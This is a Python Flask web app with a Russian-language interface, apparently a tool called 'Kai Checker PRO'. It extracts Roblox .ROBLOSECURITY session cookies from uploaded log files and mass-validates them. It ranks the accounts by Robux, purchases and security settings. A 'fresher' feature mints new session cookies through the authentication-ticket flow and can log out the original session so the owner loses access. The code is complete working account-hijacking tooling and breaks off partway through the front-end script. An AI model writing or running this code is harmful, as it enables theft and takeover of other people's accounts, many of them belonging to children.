import os
import time
import logging
import re
import urllib3
import json
import requests
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO

os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHECKER_HISTORY_FILE = "history/checker_history.json"
FRESHER_HISTORY_FILE = "history/fresher_history.json"

def load_history(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except: return []

def save_history(fp, data):
    try:
        with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)
    except: pass

def add_checker_history(entry):
    h = load_history(CHECKER_HISTORY_FILE)
    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'type': entry.get('type','single'), 'total': entry.get('total',1), 'valid': entry.get('valid',0), 'cookies': entry.get('cookies',[])[:20], 'download_url': entry.get('download_url','')})
    if len(h) > 50: h = h[-50:]
    save_history(CHECKER_HISTORY_FILE, h)

def add_fresher_history(entry):
    h = load_history(FRESHER_HISTORY_FILE)
    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'mode': entry.get('mode','duplicate'), 'refreshed_count': entry.get('refreshed_count',0), 'cookies': entry.get('cookies',[])[:20]})
    if len(h) > 50: h = h[-50:]
    save_history(FRESHER_HISTORY_FILE, h)

def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_full_info(cookie):
    info = {'status':'❌','Username':'?','UserID':'?','Robux':0,'Created':'?','Country':'?','EmailSet':False,'TwoFactorEnabled':False,'AccountPinEnabled':False,'PhoneSet':False,'SecurityStatus':'⚠️ НИЗКИЙ','Cookie':cookie,'PurchasedGamepasses':{},'CreditCardsCount':0,'IsPremium':False,'DonationTotal':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']
        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except: return {}
        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True
        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass
        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')
        try:
            total = 0; gp_dict = {}; cursor = ""; page = 0
            while page < 5:
                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                if cursor: url += f"&cursor={cursor}"
                r = s.get(url, verify=False, timeout=10)
                if r.status_code != 200: break
                data = r.json()
                for item in data.get('data',[]):
                    price = abs(item.get('currency',{}).get('amount',0)); total += price
                    if price >= 50:
                        nm = item.get('details',{}).get('name','Товар')
                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                        if pn not in gp_dict: gp_dict[pn] = []
                        gp_dict[pn].append({'name':nm,'price':price})
                cursor = data.get('nextPageCursor')
                if not cursor: break
                page += 1; time.sleep(0.1)
            info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
        except: pass
        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False,'cookie':cookie,'score':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY':c}, timeout=10, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                result['status'] = '✅'; result['username'] = d.get('name','?'); result['user_id'] = d.get('id','?')
                uid = result['user_id']
                try:
                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rb.status_code == 200: result['robux'] = rb.json().get('robux',0)
                except: pass
                try:
                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rd.status_code == 200:
                        cr = rd.json().get('created','')
                        if cr: result['created'] = datetime.fromisoformat(cr.replace('Z','+00:00')).strftime('%d.%m.%Y')
                except: pass
                try:
                    pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed',False)
                except: pass
                try:
                    st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if st.status_code == 200:
                        sec = st.json().get('MyAccountSecurityModel',{})
                        result['has_email'] = sec.get('IsEmailSet',False); result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
                except: pass
                score = 0
                if result['robux'] >= 10000: score += 100
                elif result['robux'] >= 1000: score += 50
                elif result['robux'] >= 100: score += 25
                elif result['robux'] > 0: score += 10
                if result['is_premium']: score += 50
                if result['has_email']: score += 15
                if result['has_2fa']: score += 10
                result['score'] = score
    except: pass
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

# ===== ФРЕШЕР ИЗ MEOW TOOLS =====
def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"
            return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?')
        result['user_id'] = user_data.get('id', '?')
        
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"
            return result
        
        ticket_headers = {
            'User-Agent': 'Mozilla/5.0',
            'RBXauthenticationNegotiation': '1',
            'referer': 'https://www.roblox.com/hewhewhew',
            'X-CSRF-Token': csrf_token,
            'Content-Type': 'application/json'
        }
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"
            return result
        
        redeem_headers = {
            'User-Agent': 'Mozilla/5.0',
            'RBXauthenticationNegotiation': '1',
            'Content-Type': 'application/json'
        }
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value:
                    new_cookie_value = co.value; break
        
        if not new_cookie_value:
            result['error'] = "New cookie not found"
            return result
        
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json', 'Set-Cookie': '.ROBLOSECURITY=; Max-Age=0; Path=/;'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value
            result['success'] = True
            logger.info(f"✅ НОВАЯ КУКА для {result['username']}")
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        logger.error(f"Refresh error: {e}")
        result['error'] = str(e)
    return result

def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else ("🟢" if score>=30 else "🔹")))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣ {result['robux']:,} | {result['created']} | Score:{score} {' '.join(badges)}"
    return "❌ НЕВАЛИД"

def merge_cookie_files(contents):
    all_cookies = set()
    for c in contents:
        for l in c.split('\n'):
            l = l.strip()
            if len(l)>20: all_cookies.add(l)
    return '\n'.join(sorted(all_cookies))

def split_cookies_by_count(content, count):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    files = []
    for i in range(0, len(cookies), count): files.append('\n'.join(cookies[i:i+count]))
    return files

def split_cookies_by_files(content, num):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    if num<=0: return []
    per = len(cookies)//num; rem = len(cookies)%num
    files = []; idx = 0
    for i in range(num):
        end = idx+per+(1 if i<rem else 0)
        files.append('\n'.join(cookies[idx:end])); idx=end
    return files

def remove_duplicates(content):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    return '\n'.join(list(dict.fromkeys(cookies)))

def clean_cookies(content):
    cookies = []
    for l in content.split('\n'):
        l = l.strip()
        if not l: continue
        if '.ROBLOSECURITY=' in l:
            val = l.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
            cookies.append(f'.ROBLOSECURITY={val}')
        elif len(l)>50 and not l.startswith('#'): cookies.append(l)
    return '\n'.join(cookies)

app = Flask(__name__)

HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;min-height:100vh;padding:24px;background:#0b081a;background-image:radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%)}
        .wrapper{max-width:1400px;margin:0 auto;padding:30px;background:rgba(18,10,40,0.95);border:2px solid #6c5ce7;border-radius:32px;box-shadow:0 0 60px rgba(108,92,231,0.25)}
        ::-webkit-scrollbar{width:6px;height:6px}
        ::-webkit-scrollbar-track{background:#0d0722;border-radius:8px}
        ::-webkit-scrollbar-thumb{background:#a855f7;border-radius:8px}
        .header{display:flex;justify-content:space-between;align-items:center;padding:20px 0 16px;border-bottom:1px solid #2a1a50;margin-bottom:30px}
        .logo{font-size:34px;font-weight:900;font-style:italic;background:linear-gradient(135deg,#c084fc,#f472b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:28px}
        .tab{padding:10px 22px;background:rgba(26,16,64,0.9);border:1px solid #2a1a50;border-radius:40px;color:#9880c0;cursor:pointer;font-size:14px;font-weight:600;transition:all 0.25s;user-select:none}
        .tab:hover{border-color:#a855f7;color:#fff}
        .tab.active{border-color:#c084fc;background:rgba(168,85,247,0.3);color:#c084fc}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .card{background:rgba(18,10,40,0.9);border:1px solid #2a1a50;border-radius:20px;padding:28px 30px;margin-bottom:24px}
        .card h2{font-size:20px;color:#d4c0ff;margin-bottom:18px;font-weight:700}
        .btn{padding:12px 28px;border:none;border-radius:40px;font-size:14px;font-weight:700;cursor:pointer;color:#fff;display:inline-flex;align-items:center;gap:10px;text-decoration:none}
        .btn-primary{background:linear-gradient(135deg,#a855f7,#d946ef)}
        .btn-success{background:linear-gradient(135deg,#10b981,#059669)}
        .btn-secondary{background:rgba(255,255,255,0.06);border:1px solid #2a1a50;color:#d4c0ff}
        .btn-danger{background:rgba(220,38,38,0.2);border:1px solid rgba(220,38,38,0.3);color:#fca5a5}
        .btn-sm{padding:8px 16px;font-size:12px}
        .toggle-group{display:flex;background:#0d0722;border:1px solid #2a1a50;border-radius:16px;padding:4px;gap:4px;margin-bottom:18px}
        .toggle-btn{flex:1;padding:12px 16px;background:transparent;border:none;border-radius:12px;color:#9880c0;font-size:13px;font-weight:600;cursor:pointer;text-align:center}
        .toggle-btn.active{background:linear-gradient(135deg,rgba(168,85,247,0.3),rgba(217,70,239,0.3));color:#c084fc}
        textarea,.upload-area{width:100%;padding:14px 16px;background:#0d0722;border:1px solid #2a1a50;border-radius:14px;color:#fff;font-family:monospace;font-size:14px;resize:vertical}
        textarea:focus{border-color:#a855f7;outline:none}
        .upload-area{min-height:100px;display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;border-style:dashed;gap:6px;text-align:center}
        .result-box{background:#0d0722;border:1px solid #2a1a50;border-radius:16px;padding:18px;margin-top:20px;max-height:500px;overflow-y:auto;font-family:monospace;font-size:13px;color:#fff;white-space:pre-wrap;word-break:break-all}
        .progress-bar{margin-top:12px;background:#0d0722;border-radius:40px;height:6px;overflow:hidden}
        .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#a855f7,#ec4899);transition:width 0.3s}
        .footer{text-align:center;padding:30px 0 12px;color:#4a3a6a;font-size:13px;border-top:1px solid #1a1040;margin-top:30px}
        .tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px}
        .tool-card{background:rgba(18,10,40,0.9);border:1px solid #2a1a50;border-radius:20px;padding:24px}
        .tool-card h3{font-size:16px;color:#c084fc;margin-bottom:8px}
        .tool-card .desc{color:#9880c0;font-size:13px;margin-bottom:16px}
        .tool-card .upload-area{min-height:70px;margin-bottom:12px}
        .input-row{display:flex;gap:10px;align-items:center;margin-bottom:12px}
        .input-row input{flex:1;padding:14px 16px;background:#0d0722;border:1px solid #2a1a50;border-radius:14px;color:#fff;font-size:14px}
        .input-row span{color:#9880c0;font-size:14px}
        .tool-card .btn{margin-top:auto}
        .tool-card .result-box{max-height:150px;margin-top:12px;font-size:12px}
        .file-list{max-height:150px;overflow-y:auto;margin:10px 0;padding:8px;background:#0d0722;border-radius:10px}
        .file-item{background:rgba(26,16,64,0.6);padding:8px 12px;margin:4px 0;border-radius:8px;font-size:12px;color:#9880c0}
        .history-section{margin-top:24px;border-top:1px solid #1a1040;padding-top:20px}
        .history-section h3{font-size:16px;color:#d4c0ff;margin-bottom:14px;display:flex;align-items:center;justify-content:space-between}
        .history-item{background:rgba(14,8,30,0.8);border:1px solid #1a1040;border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer}
        .history-item:hover{border-color:#a855f7}
        .hist-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
        .hist-date{color:#a855f7;font-size:13px;font-weight:600}
        .hist-stats{color:#9880c0;font-size:12px}
        .hist-detail{display:none;margin-top:10px;white-space:pre-wrap;font-size:12px;color:#d4c0ff;max-height:200px;overflow-y:auto}
        .empty-history{text-align:center;padding:30px;color:#4a3a6a;font-size:14px}
        .flex-row{display:flex;flex-wrap:wrap;gap:18px}
        .flex-2{flex:2}
        .flex-1{flex:1}
        .mt-12{margin-top:12px}
        .mt-18{margin-top:18px}
        .gap-12{display:flex;gap:12px;flex-wrap:wrap}
        .gap-8{display:flex;gap:8px}
        .timer{color:#00b894;font-family:monospace;font-weight:600;font-size:13px;background:rgba(0,184,148,0.1);padding:4px 10px;border-radius:12px}
        .checker-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
        @media(max-width:900px){.checker-grid{grid-template-columns:1fr}}
        .extract-info{background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.3);border-radius:12px;padding:10px 14px;margin-top:8px;color:#10b981;font-size:13px}
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        <div style="display:flex;align-items:center;gap:15px;">
            <span class="timer" id="sessionTimer">⏱️ 00:00:00</span>
            <span style="color:#4a3a6a">⚡ PRO</span>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="tools">🧰 Инструменты</div>
    </div>

    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Вставьте ОДИН кук для полной проверки</p>
                <textarea id="singleCookie" placeholder="Вставьте кук..." rows="3"></textarea>
                <div class="mt-12"><button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить</button></div>
                <div class="progress-bar"><div class="progress-fill" id="singleProgress"></div></div>
                <div class="result-box" id="singleResult">Результат здесь...</div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка</h2>
                <p style="color:#9880c0;font-size:13px;margin-bottom:14px;">Загрузите TXT файл. <b style="color:#10b981;">Куки извлекаются автоматически!</b></p>
                <div class="upload-area" onclick="document.getElementById('massFile').click()" style="min-height:120px;">
                    <p>📁 <strong>Загрузить TXT файл</strong></p>
                    <p style="font-size:12px;color:#9880c0;">Поддерживаются логи и чистые куки</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" style="margin-top:8px;color:#00b894;font-size:13px;"></div>
                <div id="extractInfo" class="extract-info" style="display:none;"></div>
                <div class="mt-12"><button class="btn btn-success" onclick="runMassCheck()" style="width:100%;">🚀 Массовая проверка</button></div>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                <div class="result-box" id="massResult">Результаты здесь...</div>
            </div>
        </div>
        <div class="card history-section">
            <h3>📋 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️ Очистить</button></h3>
            <div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div>
        </div>
    </div>

    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Фрешер сессий</h2>
            <label style="color:#d4c0ff;font-size:14px;font-weight:600;display:block;margin-bottom:8px;">Режим:</label>
            <div class="toggle-group">
                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбросить</button>
            </div>
            <input type="hidden" id="fresherMode" value="duplicate">
            <div class="flex-row">
                <div class="flex-2"><textarea id="fresherCookies" placeholder="Вставьте куки для обновления..." rows="6"></textarea></div>
                <div class="flex-1"><div class="upload-area" onclick="document.getElementById('fresherFile').click()"><p>📁 <strong>Загрузить .txt</strong></p></div><input type="file" id="fresherFile" accept=".txt" style="display:none;"></div>
            </div>
            <div class="mt-18 gap-12">
                <button class="btn btn-success" onclick="runFresher()">⚡ Обновить</button>
                <button class="btn btn-secondary" onclick="clearFresherInputs()">🧹 Очистить</button>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="fresherProgress"></div></div>
            <div class="result-box" id="fresherResult">Новые куки здесь...</div>
        </div>
        <div class="card history-section">
            <h3>📋 История обновлений <button class="btn btn-danger btn-sm" onclick="clearFresherHistory()">🗑️ Очистить</button></h3>
            <div id="fresherHistoryList"><div class="empty-history">Загрузка...</div></div>
        </div>
    </div>

    <div class="tab-content" id="tab-tools">
        <div class="tool-grid">
            <div class="tool-card"><h3>🔗 Слияние файлов</h3><p class="desc">Объедините несколько .txt файлов.</p><div class="upload-area" onclick="document.getElementById('mergeFiles').click()"><p>📁 Выбрать файлы</p></div><input type="file" id="mergeFiles" accept=".txt" multiple style="display:none;"><div class="file-list" id="mergeFileList"></div><button class="btn btn-primary" onclick="mergeCookies()" style="width:100%;">🔄 Объединить</button><div class="result-box" id="mergeResult">Результат...</div></div>
            <div class="tool-card"><h3>✂️ По количеству</h3><p class="desc">Разделите на части по N куки.</p><div class="upload-area" onclick="document.getElementById('splitCountFile').click()"><p>📁 Загрузить файл</p></div><input type="file" id="splitCountFile" accept=".txt" style="display:none;"><div class="input-row"><input type="number" id="splitCount" value="100" min="1"><span>шт.</span></div><button class="btn btn-primary" onclick="splitByCount()" style="width:100%;">📦 Разделить</button><div class="result-box" id="splitCountResult">Результат...</div></div>
            <div class="tool-card"><h3>📊 На N файлов</h3><p class="desc">Равномерно распределите.</p><div class="upload-area" onclick="document.getElementById('splitFilesFile').click()"><p>📁 Загрузить файл</p></div><input type="file" id="splitFilesFile" accept=".txt" style="display:none;"><div class="input-row"><input type="number" id="splitFilesCount" value="5" min="1"><span>файлов</span></div><button class="btn btn-primary" onclick="splitByFiles()" style="width:100%;">📂 Разделить</button><div class="result-box" id="splitFilesResult">Результат...</div></div>
            <div class="tool-card"><h3>🧹 Очистка</h3><p class="desc">Удалите дубликаты или форматируйте.</p><textarea id="cleanCookiesInput" placeholder="Вставьте куки..." rows="4"></textarea><div class="gap-8 mt-12"><button class="btn btn-primary" onclick="cleanCookies('deduplicate')" style="flex:1;">🔄 Дубликаты</button><button class="btn btn-secondary" onclick="cleanCookies('format')" style="flex:1;">📝 Формат</button></div><div class="result-box" id="cleanResult">Результат...</div></div>
        </div>
    </div>

    <div class="footer">KAI CHECKER · PRO</div>
</div>

<script>
var startTime = Date.now();
setInterval(function() {
    var d = Math.floor((Date.now() - startTime) / 1000);
    var h = String(Math.floor(d / 3600)).padStart(2, '0');
    var m = String(Math.floor((d % 3600) / 60)).padStart(2, '0');
    var s = String(d % 60).padStart(2, '0');
    document.getElementById('sessionTimer').textContent = '⏱️ ' + h + ':' + m + ':' + s;
}, 1000);

document.querySelectorAll('.tab').forEach(function(tab) {
    tab.addEventListener('click', function() {
        var tabId = this.getAttribute('data-tab');
        document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
        document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
        this.classList.add('active');
        document.getElementById('tab-' + tabId).classList.add('active');
        if (tabId === 'checker') loadCheckerHistory();
        if (tabId === 'fresher') loadFresherHistory();
    });
});

function setFresherMode(mode) {
    document.getElementById('fresherMode').value = mode;
    document.getElementById('modeDuplicate').classList.toggle('active', mode === 'duplicate');
    document.getElementById('modeKill').classList.toggle('active', mode === 'kill');
}

document.getElementById('fresherFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        var reader = new FileReader();
        reader.onload = function(evt) { document.getElementById('fresherCookies').value = evt.target.result; };
        reader.readAsText(this.files[0]);
    }
});

document.getElementById('massFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        var file = this.files[0];
        document.getElementById('massFileInfo').textContent = '✅ ' + file.name;
        var reader = new FileReader();
        reader.onload = function(evt) {
            window.massFileContent = evt.target.result;
            var fd = new FormData();
            fd.append('file', new Blob([window.massFileContent]));
            fetch('/api/extract-preview', { method: 'POST', body: fd })
                .then(function(r) { return r.json(); })
                .then(function(d) {
                    if (d.success) {
                        document.getElementById('extractInfo').style.display = 'block';
                        document.getElementById('extractInfo').textContent = '🔍 Найдено куков: ' + d.count;
                    }
                });
        };
        reader.readAsText(file);
    }
});

document.getElementById('mergeFiles').addEventListener('change', function(e) {
    var list = document.getElementById('mergeFileList'); list.innerHTML = '';
    if (this.files) {
        Array.from(this.files).forEach(function(f, i) {
            var div = document.createElement('div'); div.className = 'file-item';
            div.textContent = (i+1) + '. ' + f.name; list.appendChild(div);
        });
    }
});

document.getElementById('splitCountFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        var reader = new FileReader();
        reader.onload = function(evt) { window.splitCountContent = evt.target.result; };
        reader.readAsText(this.files[0]);
    }
});

document.getElementById('splitFilesFile').addEventListener('change', function(e) {
    if (this.files && this.files[0]) {
        var reader = new FileReader();
        reader.onload = function(evt) { window.splitFilesContent = evt.target.result; };
        reader.readAsText(this.files[0]);
    }
});

async function runSingleCheck() {
    var resBox = document.getElementById('singleResult');
    var cookie = document.getElementById('singleCookie').value.trim();
    if (!cookie) { resBox.textContent = '❌ Вставьте кук!'; return; }
    resBox.textContent = '⏳ Проверка...';
    try {
        var r = await fetch('/api/single-check', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookie: cookie }) });
        var d = await r.json();
        resBox.textContent = d.success ? d.report : '❌ ' + (d.message || 'Ошибка');
        loadCheckerHistory();
    } catch(e) { resBox.textContent = '❌ ' + e.message; }
}

async function runMassCheck() {
    var resBox = document.getElementById('massResult');
    if (!window.massFileContent) { resBox.textContent = '❌ Загрузите TXT файл!'; return; }
    resBox.textContent = '⏳ Извлечение и проверка...';
    try {
        var fd = new FormData(); fd.append('file', new Blob([window.massFileContent]));
        var r = await fetch('/api/mass-check', { method: 'POST', body: fd });
        var d = await r.json();
        if (d.success) {
            var html = '📊 Извлечено: ' + d.extracted_count + ' | Проверено: ' + d.total + '\n';
            html += '✅ Валид: ' + d.valid_count + ' | ❌ Невалид: ' + d.invalid_count + '\n';
            html += '💠 Premium: ' + (d.premium_count||0) + ' | 💰 Robux: ' + (d.total_robux||0).toLocaleString() + '\n\n';
            html += '══════ 🏆 ОТ ЛУЧШИХ К ХУДШИМ ══════\n\n';
            for (var i = 0; i < d.results.length; i++) html += d.results[i] + '\n';
            if (d.download_url) html += '\n📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать отчет</a>';
            resBox.innerHTML = html;
            loadCheckerHistory();
        } else { resBox.textContent = '❌ ' + (d.message || 'Ошибка'); }
    } catch(e) { resBox.textContent = '❌ ' + e.message; }
}

async function runFresher() {
    var resBox = document.getElementById('fresherResult');
    var cookies = document.getElementById('fresherCookies').value.trim();
    var mode = document.getElementById('fresherMode').value;
    if (!cookies) { resBox.textContent = '❌ Вставьте куки!'; return; }
    resBox.textContent = '⏳ Обновление...';
    try {
        var r = await fetch('/api/fresher', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies: cookies, mode: mode }) });
        var d = await r.json();
